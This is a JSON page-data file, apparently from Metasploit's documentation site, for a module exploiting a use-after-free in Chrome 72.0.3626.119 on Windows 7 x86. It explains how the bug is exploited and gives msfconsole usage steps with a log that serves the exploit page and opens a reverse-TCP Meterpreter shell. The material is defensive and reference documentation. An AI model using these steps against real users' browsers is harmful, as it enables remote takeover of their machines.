{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/browser/chrome_filereader_uaf","result":{"data":{"moduleMetadataJson":{"id":"fac73026-9003-5498-a398-982b31257b01","name":"Chrome 72.0.3626.119 FileReader UaF exploit for Windows 7 x86","fullname":"exploit/windows/browser/chrome_filereader_uaf","description":"This exploit takes advantage of a use after free vulnerability in Google\n      Chrome 72.0.3626.119 running on Windows 7 x86.\n        The FileReader.readAsArrayBuffer function can return multiple references to the\n      same ArrayBuffer object, which can be freed and overwritten with sprayed objects.\n      The dangling ArrayBuffer reference can be used to access the sprayed objects,\n      allowing arbitrary memory access from Javascript. This is used to write and\n      execute shellcode in a WebAssembly object.\n        The shellcode is executed within the Chrome sandbox, so you must explicitly\n      disable the sandbox for the payload to be successful.","rank":0,"fields":{"detailsSlug":"/modules/details/exploit/windows/browser/chrome_filereader_uaf","documentationSlug":"/modules/documentation/exploit/windows/browser/chrome_filereader_uaf"},"documentation":{"html":"<h2 id=\"description\" style=\"position:relative;\"><a href=\"#description\" aria-label=\"description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Description</h2>\n<p>The FileReader.readAsArrayBuffer function can return multiple references to the same ArrayBuffer object, which can be freed and overwritten with sprayed objects.  The dangling ArrayBuffer reference can be used to access the sprayed objects, allowing arbitrary memory access from Javascript. This is used to write and execute shellcode in a WebAssembly object.</p>\n<p>The shellcode is executed within the Chrome sandbox, so you must explicitly disable the sandbox for the payload to be successful, e.g:</p>\n<p><code class=\"language-text\">C:\\Program Files\\Google\\Chrome\\Application&gt;chrome.exe --no-sandbox</code></p>\n<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This exploit takes advantage of a use after free vulnerability in Google Chrome 72.0.3626.119 running on Windows 7 x86.\nAdditional memory protections mean this exploit technique is not as straightforward on x64 versions of Windows.</p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/browser/chrome_filereader_uaf</code></li>\n<li>Do: <code class=\"language-text\">Choose a payload and set any specific options</code></li>\n<li>Do: <code class=\"language-text\">run</code>, after a target browses to the generated URL, you should receive a session.</li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"windows-7-x86-with-google-chrome-7203626119---no-sandbox\" style=\"position:relative;\"><a href=\"#windows-7-x86-with-google-chrome-7203626119---no-sandbox\" aria-label=\"windows 7 x86 with google chrome 7203626119   no sandbox permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Windows 7 x86 with Google Chrome 72.0.3626.119 (--no-sandbox)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 &gt; use exploit/windows/browser/chrome_filereader_uaf\nmsf5 exploit(windows/browser/chrome_filereader_uaf) &gt; set URIPATH /\nURIPATH =&gt; /\nmsf5 exploit(windows/browser/chrome_filereader_uaf) &gt; set LHOST 192.168.0.1\nLHOST =&gt; 192.168.0.1\nmsf5 exploit(windows/browser/chrome_filereader_uaf) &gt; run\n[*] Started reverse TCP handler on 192.168.0.1:4444\n[*] Using URL: http://0.0.0.0:8080/\n[*] Local IP: http://192.168.0.1:8080/\n[*] Server started.\n[*] 192.168.0.1   chrome_filereader_uaf - Sending /\n[*] 192.168.0.1   chrome_filereader_uaf - Sending /favicon.ico\n[*] 192.168.0.1   chrome_filereader_uaf - Sending /exploit.html\n[*] 192.168.0.1   chrome_filereader_uaf - Sending /worker.js\n[*] Sending stage (179779 bytes) to 192.168.0.1\n[*] Meterpreter session 1 opened (192.168.0.1:4444 -&gt; 192.168.0.1:60876) at 2019-05-06 16:49:06 +0800</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"fac73026-9003-5498-a398-982b31257b01"}}}